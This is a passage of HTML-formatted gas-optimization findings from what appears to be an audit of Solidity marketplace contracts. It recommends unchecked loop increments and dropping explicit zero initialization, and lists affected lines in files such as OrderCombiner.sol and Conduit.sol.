class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">291</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">373</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">473</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOfferFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">498</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalConsiderationFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">577</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">598</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">754</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">471</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>The code would go from:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"66\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numIterations</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">// ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}  </span></span></span></code></pre>\n<p>to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"67\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">numIterations</span><span class=\"mtk1\">;) {  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk3\">// ...  </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> { ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">; }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}  </span></span></span></code></pre>\n<p>The risk of overflow is inexistant for <code>uint256</code> here.</p>\n<p>Note that this is already applied at some places in the solution. As an example:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"68\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">conduit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Conduit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">66</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalStandardTransfers</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">74</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">75</span><span class=\"mtk1\">                  ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">76</span><span class=\"mtk1\">              }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">130</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalStandardTransfers</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">138</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">139</span><span class=\"mtk1\">                  ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">140</span><span class=\"mtk1\">              }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicOrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">948</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdditionalRecipients</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">975</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">976</span><span class=\"mtk1\">                  ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">977</span><span class=\"mtk1\">              }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">1040</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdditionalRecipients</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">1064</span><span class=\"mtk1\">:             </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">1065</span><span class=\"mtk1\">                  ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">1066</span><span class=\"mtk1\">              }</span></span></span></code></pre>\n<h2 id=\"g-14-no-need-to-explicitly-initialize-variables-with-default-values\" style=\"position:relative;\"><a href=\"#g-14-no-need-to-explicitly-initialize-variables-with-default-values\" aria-label=\"g 14 no need to explicitly initialize variables with default values permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-14] No need to explicitly initialize variables with default values</h2>\n<p><em>This finding is only true without the Optimizer</em></p>\n<p>If a variable is not set/initialized, it is assumed to have the default value (<code>0</code> for <code>uint</code>, <code>false</code> for <code>bool</code>, <code>address(0)</code> for address…). Explicitly initializing it with its default value is an anti-pattern and wastes gas.</p>\n<p>As an example: <code>for (uint256 i = 0; i &#x3C; numIterations; ++i) {</code> should be replaced with <code>for (uint256 i; i &#x3C; numIterations; ++i) {</code></p>\n<p>Affected code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"69\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">conduit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Conduit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">66</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalStandardTransfers</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">conduit</span><span class=\"mtk1\">/</span><span class=\"mtk12\">Conduit</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">130</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalStandardTransfers</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AmountDeriver</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">44</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">extraCeiling</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicOrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">948</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdditionalRecipients</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">BasicOrderFulfiller</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">1040</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdditionalRecipients</span><span class=\"mtk1\">; ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">56</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalCriteriaResolvers</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">166</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalAdvancedOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">184</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalItems</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CriteriaResolution</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">199</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalItems</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">181</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">247</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">offer</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">291</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">j</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">373</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">470</span><span class=\"mtk1\">:            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalFilteredExecutions</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">473</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOfferFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">498</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalConsiderationFulfillments</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">577</span><span class=\"mtk1\">:            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">totalOrders</span><span class=\"mtk1\">; ++</span><span class=\"mtk12\">i</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">lib</span><span class=\"mtk1\">/</span><span class=\"mtk12\">OrderCombiner</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span><span class=\"mtk1\">:</span><span class=\"mtk7\">598</span><span class=\"mtk1\">:                </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">j</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">consideration</span><span 